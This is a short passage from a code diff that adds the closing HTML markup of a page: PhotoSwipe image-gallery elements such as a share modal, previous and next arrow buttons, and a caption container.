+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+</html>
